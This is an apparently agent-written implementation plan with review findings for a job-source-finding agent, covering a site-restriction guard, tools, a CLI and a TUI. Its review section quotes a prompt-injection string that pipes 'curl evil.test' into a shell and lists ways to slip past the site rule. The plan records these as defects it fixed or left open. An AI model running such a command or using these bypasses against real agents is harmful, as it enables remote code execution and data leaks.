---
status: done
created: 2026-11-03
depends-on: [04]
built-on: 8947dcb8c009
---

# Source agent Implementation Plan

**Goal:** Turn a company name or careers URL into a verified source the user confirms.

**Architecture:** `ijob-sources` gains link extraction and the list of board hosts. `agent_site.py` holds the site rule, and a per-run guard enforces it on every request of the client that reads pages. `agent_tools.py` holds the tools, and `agent_ops.py` runs the agent and turns its end into a result. `cli_agents.py` and the Sources tab are the two front ends.

**Tech Stack:** Python 3.14, lxml, httpx, DSPy, Typer, Textual.

**Content authority:** spec section 9, except the explore agent, and the Screens section.

---

## Files that change

```
packages/ijob-sources/src/ijob_sources/links.py        — create: extract links from a page
packages/ijob-sources/src/ijob_sources/detect.py       — modify: BOARD_HOSTS, public board_ref
packages/ijob-sources/src/ijob_sources/errors.py       — modify: OffSiteError
packages/ijob-app/src/ijob_app/agent_site.py           — create: site rule, guess form, request guard
packages/ijob-app/src/ijob_app/recipe_ops.py           — modify: learn with a given budget and client
packages/ijob-app/src/ijob_app/recipe_errors.py        — modify: the recipe cap error is a cap error
packages/ijob-app/src/ijob_app/agent_tools.py          — create: source agent tools
packages/ijob-app/src/ijob_app/agent_ops.py            — create: inner runner, find operation, results
packages/ijob-app/src/ijob_app/service.py              — modify: find and add methods
packages/ijob-app/src/ijob_app/agent_view.py           — create: drawing for agent screens
packages/ijob-app/src/ijob_app/cli_agents.py           — create: sources find
packages/ijob-app/src/ijob_app/cli.py                  — modify: register the command
packages/ijob-app/src/ijob_app/tui/found.py            — create: confirm modal
packages/ijob-app/src/ijob_app/tui/sources.py          — modify: blank URL starts the agent
```

## Order of work

### Task 1 — Read links and name board hosts

**Files:**
- Create `packages/ijob-sources/src/ijob_sources/links.py` — `extract_links(body, base_url)`.
- Modify `packages/ijob-sources/src/ijob_sources/detect.py` — public `BOARD_HOSTS` and `board_ref(url)`, built from the existing table; `_hiring_system_ref` callers move to `board_ref`.
- Modify `packages/ijob-sources/src/ijob_sources/errors.py` — `OffSiteError(SourcesError)`.
- Test `packages/ijob-sources/tests/ijob_sources_tests/test_links.py`, `packages/ijob-sources/tests/ijob_sources_tests/test_detect.py`, `packages/ijob-sources/tests/ijob_sources_tests/test_errors.py`.

**Change:** `extract_links` returns resolved `http` and `https` links with cleaned text, no fragments and no duplicates. `BOARD_HOSTS` maps the six hosts of `detect.py:46-50` to their kinds.

**Proof:**
- `test_links_resolve_relative_addresses` — against the base URL.
- `test_links_drop_other_schemes` — `mailto:` and `javascript:`.
- `test_links_drop_fragments_and_duplicates` — one entry remains.
- `test_links_clean_text` — control characters removed, text cut to 100 characters.
- `test_links_of_a_non_html_body` — an empty list, and no error.
- `test_board_hosts_match_board_ref` — every host resolves a sample URL to its kind.
- `test_off_site_error_is_a_sources_error` — caught with the family.

**Done when:** `uv run --locked pytest packages/ijob-sources/tests/ijob_sources_tests/test_links.py` passes and the Definition of Done is green. Commit `feat(ijob-sources): read page links and board hosts`.

### Task 2 — Enforce the site rule

**Files:**
- Create `packages/ijob-app/src/ijob_app/agent_site.py` — `SiteRule`, `guess_refusal(url)`, `site_guard(rule)`.
- Test `packages/ijob-app/tests/ijob_app_tests/test_agent_site.py`.

**Change:** Spec section 9 Site rule: allowed hosts, given URL, moving guess until a page is read, guess form, and board URLs that are no guess. The guard raises `OffSiteError` before a request is sent.

**Proof:**
- `test_allowed_hosts_table` — every row of the spec's table.
- `test_given_url_fixes_the_site` — it never moves.
- `test_failed_guess_is_replaced` — before a read, the site moves.
- `test_read_fixes_the_site` — a later guess is refused.
- `test_guess_form_table` — every example in the spec.
- `test_board_url_is_no_guess` — the site stays.
- `test_guard_stops_an_off_site_redirect` — nothing is sent to `evil.com`.
- `test_guard_allows_a_board_redirect` — it resolves to the board.

**Done when:** `uv run --locked pytest packages/ijob-app/tests/ijob_app_tests/test_agent_site.py` passes and the Definition of Done is green. Commit `feat(ijob-app): enforce the agent site rule`.

### Task 3 — Build the source agent tools

**Files:**
- Modify `packages/ijob-app/src/ijob_app/recipe_ops.py` — `learn_recipe(runtime, client, page, budget, ...)`, which `analyze_operation`'s worker and `learn_page` both call, without its own `run_items`. It checks the budget before its first call too, as `run_items` does today (`llm_ops.py:379`).
- Modify `packages/ijob-app/src/ijob_app/recipe_errors.py` — `RecipeCapReachedError` becomes a subclass of `CapReachedError`, so the agent's wrapper stores it as a stop and existing callers still catch it.
- Create `packages/ijob-app/src/ijob_app/agent_tools.py` — `SourceTools`, with `try_board`, `open_page`, `learn_page`, and its record of verified sources.
- Test `packages/ijob-app/tests/ijob_app_tests/test_recipe_ops.py`, `packages/ijob-app/tests/ijob_app_tests/test_recipe_errors.py`, `packages/ijob-app/tests/ijob_app_tests/test_agent_tools.py`.

**Change:** The tool table of spec section 9. `try_board` uses the public-host client; `open_page` and `learn_page` use the guarded one. Each tool returns text and records violations on `AgentRun`. Run-ending errors reach the wrapper from plan 04; an inner `TaskOutputError` returns its reason. `learn_page` builds its `RecipeProposal.report` from this run's budget. Its budget is chosen by the `source_recipe` model's provider where a caller supplies a per-provider choice (plan 07).

**Proof:**
- `test_analyze_operation_is_unchanged` — existing recipe tests still pass.
- `test_try_board_found` — the message, and the source is recorded as verified.
- `test_try_board_no_board` — a 404.
- `test_try_board_wrong_company` — an identity mismatch.
- `test_try_board_empty` — no jobs.
- `test_try_board_could_not_check` — a timeout, and the run records it.
- `test_try_board_refuses_other_kinds` — `not a valid board`, and no violation.
- `test_try_board_refuses_bad_keys` — `not a valid board`, and no violation.
- `test_open_page_verifies_a_board_url` — verified with one fetch.
- `test_open_page_returns_a_feed` — verified, and keeps its address.
- `test_open_page_returns_a_job_page` — verified, and keeps its address.
- `test_open_page_lists_links_only` — no page text in the result, at most 50 links, off-site links dropped.
- `test_open_page_off_site_is_a_violation` — refused and counted.
- `test_open_page_bad_guess_is_a_violation` — refused and counted.
- `test_open_page_second_guess_after_read_is_a_violation` — refused and counted.
- `test_open_page_non_public_is_a_violation` — refused and counted.
- `test_open_page_redirect_off_site_is_no_violation` — `could not open`, and not counted.
- `test_learn_page_needs_an_opened_page` — another URL is refused.
- `test_learn_page_charges_this_run` — one budget, no second trace.
- `test_learn_page_off_site_json_is_a_violation` — refused and counted.
- `test_learn_page_without_a_model_says_so` — no violation.
- `test_learn_page_unusable_answer_returns_the_reason` — no stop is stored.
- `test_learn_page_at_the_cap_stores_a_stop` — no model call, and the next model call raises the cap error.
- `test_learn_page_reading_no_jobs_returns_the_reason` — `NoTrialJobsError` as text.
- `test_recipe_cap_error_is_a_cap_error` — existing callers still catch it, in `test_recipe_errors.py`.
- `test_tool_results_are_cut` — 4,000 characters.

**Done when:** `uv run --locked pytest packages/ijob-app/tests/ijob_app_tests/test_agent_tools.py` passes and the Definition of Done is green. Commit `feat(ijob-app): add the source agent tools`.

### Task 4 — Run the source agent

**Files:**
- Create `packages/ijob-app/src/ijob_app/agent_ops.py` — `FoundSource` (a board, feed or job page, or recipe), `SourceResult`, `run_source_agent`, `find_operation`, `add_found`.
- Modify `packages/ijob-app/src/ijob_app/service.py` — `find_source`, `add_found`.
- Test `packages/ijob-app/tests/ijob_app_tests/test_agent_ops.py`.

**Change:** `run_source_agent(runtime, company, url, model, budget_for, public_client, page_client_for, on_step)` runs one agent with no `run_items` of its own, step limit 8, so explore and the suites can call it on their own budget and clients. It returns a `SourceResult`, stores no stop itself, and passes the company and any URL to the signature. `find_operation` wraps it in one `run_items` under `[llm].max_cost_usd`, with `--model` replacing the configured model. Applies "How a run ends". The answer counts only if a tool verified it; otherwise it is thrown away and counted. `add_found` adds a board through `add_source`, a feed or job page through `add_url`, a recipe through `accept_recipe`.

**Proof:**
- `test_verified_answer_is_returned` — the result is found.
- `test_unverified_answer_is_thrown_away` — not found, and a violation.
- `test_none_answer_is_not_found` — no violation.
- `test_cap_offers_a_verified_source` — the most recent, with the stop reason.
- `test_provider_failure_offers_a_verified_source` — same.
- `test_unusable_answer_offers_a_verified_source` — same.
- `test_cap_with_nothing_verified_is_not_found` — the stop reason shows.
- `test_add_found_routes_each_kind` — board, feed or page, recipe.
- `test_known_source_is_reported` — already a source.
- `test_steps_reach_the_callback` — one per tool call.
- `test_trace_has_tool_and_model_spans` — root `ijob sources find`.
- `test_find_gives_the_url_to_the_agent` — a given URL reaches the signature and fixes the site.
- `test_run_source_agent_uses_the_given_budget` — the inner runner opens no budget or trace.

**Done when:** `uv run --locked pytest packages/ijob-app/tests/ijob_app_tests/test_agent_ops.py` passes and the Definition of Done is green. Commit `feat(ijob-app): run the source agent`.

### Task 5 — Add `ijob sources find`

**Files:**
- Create `packages/ijob-app/src/ijob_app/agent_view.py` — `found_panel`, `step_line`.
- Create `packages/ijob-app/src/ijob_app/cli_agents.py` — `find_command`.
- Modify `packages/ijob-app/src/ijob_app/cli.py` — add it to the `sources` group.
- Test `packages/ijob-app/tests/ijob_app_tests/test_cli_agents.py`, `packages/ijob-app/tests/ijob_app_tests/test_agent_view.py`.

**Change:** The spec's Screens section and spec section 9 Commands. Plain lines in a pipe.

**Proof:**
- `test_find_blank_input_exits_2` — refused.
- `test_find_url_without_company_exits_2` — refused.
- `test_find_name_with_company_exits_2` — `--company` belongs to a URL only.
- `test_find_unusable_answer_exits_1` — after offering a verified source.
- `test_found_panel_draws_steps_and_sample` — in `test_agent_view.py`.
- `test_step_line_draws_outcomes` — found, none, and could not check, in `test_agent_view.py`.
- `test_find_missing_model_exits_1` — names `models.source_agent`.
- `test_find_bad_model_exits_2` — a bad `--model` reference.
- `test_find_pipe_needs_yes` — exit 1 before any call.
- `test_find_confirm_yes_adds` — source added, done line.
- `test_find_declined_exits_1` — `Not stored`.
- `test_find_known_source_exits_0` — already a source.
- `test_find_other_company_exits_2` — `SourceCompanyError`.
- `test_find_not_found_exits_1` — it names `sources add-url`.
- `test_find_cap_message` — "Stopped at the cost cap", cost and setting.
- `test_find_provider_failure_exits_1` — after offering a verified source.
- `test_find_draws_third_party_text_literally` — markup in a title is not read.
- `test_find_pipe_output_is_plain` — no box characters.

**Done when:** `uv run --locked pytest packages/ijob-app/tests/ijob_app_tests/test_cli_agents.py` passes and the Definition of Done is green. Commit `feat(ijob-app): add ijob sources find`.

### Task 6 — Find a source from the TUI

**Files:**
- Create `packages/ijob-app/src/ijob_app/tui/found.py` — `SourceFoundScreen`, Cancel focused, text with `markup=False`.
- Modify `packages/ijob-app/src/ijob_app/tui/sources.py` — the four rows of spec section 9 TUI, placeholder, message and background worker.
- Test `packages/ijob-app/tests/ijob_app_tests/test_tui.py`.

**Change:** A blank URL with a company starts the agent in the background, sharing the one-at-a-time guard. The status line shows steps and cost. A found source opens the modal; a learned recipe uses the existing one. The ends in "How a run ends" apply here too: a source verified before a stop still opens its modal, a cap's message goes on the status line, and a provider failure or unusable answer goes through notify.

**Proof:**
- `test_sources_blank_url_starts_the_agent` — with a company.
- `test_sources_url_and_company_uses_the_add_path` — unchanged.
- `test_sources_url_without_company_shows_the_message` — the new text.
- `test_sources_both_blank_shows_the_message` — the new text.
- `test_sources_placeholder_names_finding` — the new text.
- `test_found_modal_cancel_has_focus` — Enter stores nothing.
- `test_found_modal_accept_adds` — the list redraws.
- `test_found_modal_draws_text_literally` — markup is not read.
- `test_find_is_busy_while_running` — a second press says so.
- `test_find_not_found_shows_status` — with the cost.
- `test_find_error_notifies` — a missing model names its key.
- `test_find_cap_shows_the_message_on_status` — "Stopped at the cost cap", cost and setting.
- `test_find_provider_failure_notifies` — the error.
- `test_find_unusable_answer_notifies` — the error.
- `test_find_stop_with_a_verified_source_opens_the_modal` — the source is still offered.
- `test_find_learned_recipe_uses_the_recipe_modal` — not the new one.

**Done when:** `uv run --locked pytest packages/ijob-app/tests/ijob_app_tests/test_tui.py` passes and the Definition of Done is green. Commit `feat(ijob-app): find a source from the TUI`.

---

## Risks

- Riskiest step: Task 3's `recipe_ops.py` change, which touches the existing learn path. `test_recipe_ops.py` and `test_recipe_imports.py` hold it.
- A careers page on an unlisted hiring system ends as `could not open`, an accepted limit in spec section 12.
- `execute` spends nothing and calls no network: tests use fakes and `httpx.MockTransport`.

## Proof

- The five gate commands in `CLAUDE.md` exit 0.
- `uv run --locked ijob sources find --help` lists the flags of the spec.

## Review findings

Three reviews ran: site rule and links, agent tools and run logic, CLI and TUI. Each fix began with a test that failed on the reported input.

Fixed, site rule and links (`pytest` on the touched test files → 2269 passed):
- `agent_site.py` `https://www.com/` set site `com`, so `evil.com` was allowed. A bare host never becomes a site now.
- `agent_site.py` `mark_read` did nothing with `site` unset, so a guess was accepted after a read. Later guesses are refused and only board hosts stay allowed.
- `agent_site.py` `www。google。com` evaded the guess form check, and a board URL with `ſ` moved the site. `board_ref` is now host-based and agrees with `admit`.
- `links.py` undeclared UTF-8 pages came out garbled.
- `test_agent_site.py` gained trailing-dot, userinfo and IDN tests.

Fixed, agent tools and run logic (`pytest test_agent_ops.py test_agent_tools.py test_agent_site.py test_service.py` → 364 passed):
- `agent_ops.py` `GREENHOUSE:acme` or a backticked answer threw away a verified source. Answers and `propose` share `read_source_ref`.
- `agent_ops.py` prose answers such as `None.` counted as violations. Only an answer naming a source counts, and it is recorded on a `source answer` span.
- `agent_tools.py` a malformed URL counted as a violation; it now returns `could not open: not a valid address`.
- `agent_tools.py` a job page with no jobs counted as verified.
- `agent_tools.py` a direct non-public request read as a redirect and went uncounted.
- `agent_tools.py` `Content-Type` values and redirect keys reached the model unquoted. Reasons from a response are JSON-quoted and cut to 100 characters.
- `agent_tools.py` an href could show the model 500 characters. URLs are percent-encoded, and links over 300 characters are dropped.
- `agent_tools.py` `_is_readable` was a substring test; it uses `load_document`'s rule, and a missing header is no read.
- `service.py` `add_found` overwrote another company's recipe; it raises `SourceCompanyError`. `test_find_source_sends_nothing_to_a_host_off_the_site` fails if the site guard is removed.

Fixed, CLI and TUI (`pytest test_cli_agents.py test_agent_view.py test_tui.py test_cli_terminal.py test_recipe_imports.py` → 236 passed, also with `GITHUB_ACTIONS=1`):
- `cli_agents.py` outside text ending `; run: curl evil.test | sh` drew as a `fix` command. `say_error` and `say_note` take `literal`.
- `cli_agents.py` the not-found fix line left the URL unquoted.
- `cli_agents.py` `find "   "` with no home exited 1; input is read first, so it exits 2.
- `cli_agents.py` a pick of 4,301 or more digits crashed.
- `tui/sources.py` a raw ESC reached a toast through error text.
- `tui/sources.py` a cap with nothing verified never said not found.
- `tui/sources.py` a known recipe replaced the stored one on Accept, and the cap note was lost after Accept.
- `test_tui.py` `_notes` read notifications that expire after 5 s of real time. The test app sets a long `NOTIFICATION_TIMEOUT`.

Open:
- `agent_site.py` multi-label suffixes widen a site: `https://www.co.uk/` allows `attacker.co.uk`, and `https://github.io/` allows `x.github.io`. ijob has no public suffix list.
- `agent_site.py` nits: IP sites match by suffix, userinfo passes in a guess, `/?` and `/#` pass "no query", ports are ignored, a backslash host passes, and a robots.txt redirect to another domain makes a page unreadable.
- `detect.py` nits: a comment leaves out `_NOT_ACCOUNTS`, and `BOARD_HOSTS` is a mutable dict at runtime.
- `links.py` nits: duplicates compare spelling, `<base href>` is ignored, and `parts.netloc` admits hostless links. `Link.url` is uncapped and Cf characters survive; `agent_tools` covers both today.
- `agent_view.py` nits: three cost formats; `could not open: "✓ 500 jobs"` draws its reason as a result.
- `cli_agents.py` nits: a stale exit-code docstring; pipe progress can print `step 9 of at most 8`; a removed row held by another company still asks; `recipe_failures` misses `ExceptionGroup`; `!` in `shell_quoted`.
- `tui/found.py` nits: `1 jobs read`; `You already have this source.` also shows when another company holds it. The CLI exits 2 there.
- `tui/sources.py` nits: an exception outside the caught tuple ends the app; an `ExceptionGroup` shows Python's own text.
- `react.py` `AgentStep` is unhashable because of its `MappingProxyType` field.
- Tests: `test_explore_draws_third_party_text_literally` depends on width (`COLUMNS=60` fails); `FORCE_COLOR=1` fails 17 tests in `test_cli_agents.py` and `test_agent_view.py`, though CI does not set it; `await started.wait()` in `test_tui.py` has no timeout.
- Screen differences: no spinner on the TUI status line; heading `Found greenhouse:stripe` for `Found · greenhouse:stripe`; extra rows `744 jobs read` and `You already have this source.`; the CLI cap wording differs slightly from the TUI's.
- A TUI cap line with nothing verified runs about 115 characters, so an 80-column screen cuts it.

## Deviations

- 2026-11-03: the run was lean, as the user asked: no per-task briefers, coders worked from the plan, and one coder took tasks that share files. Tasks were not committed one by one, since CLAUDE.md says commit only when the user asks.
- 2026-11-03: PR #8's CI failed on 4 help tests in `test_cli_eval.py`. Typer forces styled help under `GITHUB_ACTIONS`, which splits a flag's text. Those tests now strip ANSI. Outside this plan, fixed here since it blocks the branch.
- 2026-11-03: the plan cites `llm_ops.py:379` and `recipe_ops.py:185,303`. Those lines had moved; `try_start` was at `llm_ops.py:407`.
- 2026-11-03: `learn_recipe` returns a failed JSON-address fetch as a value, since raising would make an exception group in `analyze_operation`'s worker. `_Learner` returns `RecipeCapReachedError` as a value too, as `run_items` would otherwise drop its message.
- 2026-11-03: `learn_page` counts any refused request as a violation, including a redirect hop of the model's JSON address, since `learn_recipe` does not return the URL.
- 2026-11-03: `run_source_agent` takes a resolved `ModelRef`, and `SourceResult` also carries `steps` and `could_not_check`.
- 2026-11-03: `AgentStep` gained `arguments` and `result`, and `StepCallback` takes the whole step, since plan 04's step held too little to draw the Screens section. `on_cost` was added to `find_operation`, `explore_operation` and the service for the live cost. `FoundSource` and `VerifiedSource` gained `sample`.
- 2026-11-03: the Screens section's `links to lever` row reads `N links`, since a step holds only the start of a result.
- 2026-11-03: `test_step_line_draws_outcomes` is `test_step_what_draws_outcomes`, since `step_line` draws only the spinner. Could-not-check boards print as `note:` lines.
- 2026-11-03: `Service.add_found` holds the other-company check, since the recipe route cannot see a removed row from `agent_ops.py`.
- 2026-11-03: not run on real data. Spec section 11's list spends money and needs the user's OK at each step.
